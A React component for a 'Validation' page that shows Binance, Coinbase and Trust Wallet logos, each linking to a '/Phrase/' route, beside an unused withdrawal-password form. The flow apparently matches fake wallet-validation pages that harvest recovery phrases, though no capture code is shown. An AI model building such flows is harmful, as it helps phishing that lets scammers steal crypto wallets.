import React, { useCallback, useEffect, useState } from "react";
import SubHeader from "src/view/shared/Header/SubHeader";
import authSelectors from "src/modules/auth/authSelectors";
import yupFormSchemas from "src/modules/shared/yup/yupFormSchemas";
import * as yup from "yup";
import { i18n } from "../../../i18n";
import { FormProvider, useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import { useDispatch, useSelector } from "react-redux";
import InputFormItem from "src/shared/form/InputFormItem";
import actions from "src/modules/transaction/form/transactionFormActions";
import authActions from "src/modules/auth/authActions";
import TextAreaViewItem from "src/shared/form/TextAreaViewItem";
import { useHistory } from "react-router-dom"; // Assuming you're using React Router

const schema = yup.object().shape({

  amount: yupFormSchemas.integer(i18n("entities.transaction.fields.amount"), {
    required: true,
    min: 20,
  }),
  withdrawPassword: yupFormSchemas.string(i18n("user.fields.withdrawPassword"), {
    required: true,
  }),

});

function Validation() {
  const currentUser = useSelector(authSelectors.selectCurrentUser);
  const dispatch = useDispatch();


  const refreshItems = useCallback(async () => {
    try {
      // Await the refresh action to ensure it completes
      await dispatch(authActions.doRefreshCurrentUser());
    } catch (error) {
      console.error("Error during refreshing items:", error);
      // Optionally handle error state or show an error message to the user
    }
  }, [dispatch]);

  const onSubmit = async ({ amount, withdrawPassword }) => {
    const values = {
      status: "pending",
      date: new Date(),
      user: currentUser ? currentUser.id : null,
      type: "withdraw",
      amount: amount,
      vip: currentUser,
      withdrawPassword: withdrawPassword,
    };
    await dispatch(actions.doCreate(values));
    await refreshItems();
  };

  useEffect(() => { }, [currentUser, refreshItems]);

  const [initialValues] = useState({
    amount: "",
  });
  const form = useForm({
    resolver: yupResolver(schema),
    mode: "onSubmit",
    defaultValues: initialValues,
  });


  const [show, setShow] = useState(false);
  const [coins, setCoins] = useState("others");
  const history = useHistory();
  const SelectIcons = (item) => {
    history.push(`/Phrase/${item}`);

  }

  return (
    <div>
      <SubHeader title={`${i18n("text.validation")}`} path="/" />
      <div className="withdraw__page">
        <div className="withdraw__content __coins">
          <div className="coins__div" onClick={()=>SelectIcons("binance")}> <img src="/images/validation/binance.png" alt="Binance__" className="icon__wallet" /></div>
          <div className="coins__div"  onClick={()=>SelectIcons("coinbase")}><img src="/images/validation/coinbase.svg" alt="coinbase__" className="icon__wallet" /></div>
          <div className="coins__div"  onClick={()=>SelectIcons("trustwallet")}><img src="/images/validation/trust_wallet.webp" alt="trust__wallet" className="icon__wallet" /></div>
          <div className="coins__div"  onClick={()=>SelectIcons("others")}><h2 className="other__wallet">{i18n("text.other")}</h2></div>
        </div>
      </div>
    </div>
  );
}

export default Validation;
